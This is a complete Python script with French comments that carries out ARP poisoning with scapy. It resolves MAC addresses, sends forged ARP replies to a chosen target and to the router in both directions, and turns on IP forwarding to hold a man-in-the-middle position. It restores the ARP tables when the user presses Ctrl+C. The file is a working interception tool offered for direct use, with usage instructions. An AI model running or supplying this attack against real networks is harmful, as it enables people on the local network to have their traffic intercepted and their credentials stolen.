import scapy.all as scapy
import time
import sys

def get_mac(ip):
    """Trouve l'adresse MAC d'une IP via ARP request"""
    arp_request = scapy.ARP(pdst=ip)
    broadcast  = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    paquet     = broadcast / arp_request
    reponse    = scapy.srp(paquet, timeout=2, verbose=False)[0]
    return reponse[0][1].hwsrc

def empoisonner(ip_cible, ip_routeur):
    """
    Envoie un faux paquet ARP à la cible :
    'L'adresse MAC du routeur, c'est MOI'
    """
    mac_cible  = get_mac(ip_cible)
    paquet     = scapy.ARP(
        op=2,
        pdst=ip_cible,
        hwdst=mac_cible,
        psrc=ip_routeur
    )
    scapy.send(paquet, verbose=False)

def restaurer(ip_cible, ip_routeur):
    """
    Remet les vraies adresses MAC dans la table ARP
    Important : toujours appeler ça en fin d'attaque
    """
    mac_cible   = get_mac(ip_cible)
    mac_routeur = get_mac(ip_routeur)
    paquet = scapy.ARP(
        op=2,
        pdst=ip_cible,
        hwdst=mac_cible,
        psrc=ip_routeur,
        hwsrc=mac_routeur
    )
    scapy.send(paquet, count=5, verbose=False)
    print("[+] Table ARP restaurée")

def lancer(ip_cible, ip_routeur):
    """Boucle principale d'empoisonnement"""
    print(f"[*] MITM actif : {ip_cible} <──> {ip_routeur}")
    print("[*] Ctrl+C pour arrêter proprement\n")


    import os
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    paquets_envoyes = 0
    try:
        while True:

            empoisonner(ip_cible, ip_routeur)
            empoisonner(ip_routeur, ip_cible)
            paquets_envoyes += 2
            print(f"\r[+] Paquets ARP envoyés : {paquets_envoyes}", end="")
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[*] Arrêt — restauration ARP...")
        restaurer(ip_cible, ip_routeur)
        restaurer(ip_routeur, ip_cible)
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage : sudo python3 arp_poison.py <IP_CIBLE> <IP_ROUTEUR>")
        print("Exemple : sudo python3 arp_poison.py 192.168.1.42 192.168.1.1")
        sys.exit(1)
    lancer(sys.argv[1], sys.argv[2])